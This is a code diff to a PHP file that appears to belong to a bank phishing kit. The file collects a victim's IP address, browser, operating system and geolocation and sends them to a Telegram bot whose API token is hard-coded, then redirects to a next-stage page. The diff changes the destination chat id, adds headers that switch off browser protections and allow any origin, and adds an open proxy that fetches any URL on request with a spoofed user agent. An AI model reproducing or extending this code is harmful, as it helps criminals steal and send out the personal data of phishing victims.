@@ -8,11 +8,50 @@
  include "/251818/040147.php"; 
  include "/251818/040151.php"; 
 
+header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
+header("X-XSS-Protection: 0");
+header("X-Frame-Options: ALLOWALL");
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Credentials: true");
+header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
+header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
+
+if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
+    $url = $_GET['url'];
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
+        "X-XSS-Protection: 0",
+        "X-Frame-Options: ALLOWALL",
+        "Access-Control-Allow-Origin: *",
+        "Access-Control-Allow-Credentials: true",
+        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
+        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
+    ));
+    $response = curl_exec($ch);
+    $info = curl_getinfo($ch);
+    curl_close($ch);
+
+    header("HTTP/1.1 ".$info['http_code']);
+    foreach ($info['headers'] as $header) {
+        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
+            header($header);
+        }
+    }
+    echo $response;
+    exit;
+}
+
+
+
+
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
-
-
 
 function get_client_ip()
 {
@@ -172,13 +211,15 @@ if ($success==false) {
 
 $message = "\n\n \n$url\n===========$bank============\n\nCLICKED ON $date AT $time\n\n $ip\n\n$uaget\n\n$uos\n$bsr\n\n$is\n\n$city\n$country\n$continent\n\n maps.google.com/?q=$la$lh$lp\n\n======$project==== \n";
  
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA";
 $data = [
-    'chat_id' => '-1001831940786',
+    'chat_id' => '-821080105',
     'text' => $message
 ];
+
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-                                 http_build_query($data) );
+    http_build_query($data));
+
 
 
 header('Location: MOT_3.php');
